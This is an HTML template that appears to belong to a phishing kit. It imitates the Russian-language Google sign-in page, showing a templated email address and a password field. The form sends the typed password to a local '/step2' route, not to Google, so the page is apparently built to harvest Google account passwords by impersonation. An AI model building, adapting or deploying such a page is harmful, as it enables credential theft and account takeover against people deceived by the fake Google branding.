<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Вход – аккаунты Google</title>
<link rel="icon" type="image/png" href="/static/google_logo.png">
<link rel="stylesheet" href="/static/style.css">
<script>
  (function() {
    var saved = localStorage.getItem('theme');
    if (saved) document.documentElement.setAttribute('data-theme', saved);
  })();
</script>
</head>
<body>

  <div class="main">
    <img class="logo" src="/static/google_logo.png" alt="Google">

    <h1>Добро пожаловать!</h1>

    <div class="account">
      <div class="avatar">👤</div>
      <span>{{ email }}</span>
      <span class="arrow">▼</span>
    </div>

    <form action="/step2" method="POST" autocomplete="off">
      <div class="field">
        <input type="password" name="password" id="pw" required autofocus>
        <label>Введите пароль</label>
      </div>

      <label class="checkbox">
        <input type="checkbox" onclick="document.getElementById('pw').type = this.checked ? 'text' : 'password'">
        Показать пароль
      </label>

      <div class="actions">
        <a class="forgot" href="#">Другой способ</a>
        <button type="submit">Далее</button>
      </div>
    </form>
  </div>

  <footer class="footer">
    <div class="footer-row">
      <div class="footer-left">
        <a href="#">Русский</a>
        <span class="lang-arrow">▼</span>
      </div>
      <div class="footer-right">
        <a href="#">Справка</a>
        <a href="#">Конфиденциальность</a>
        <a href="#">Условия</a>
      </div>
    </div>
  </footer>

</body>
</html>
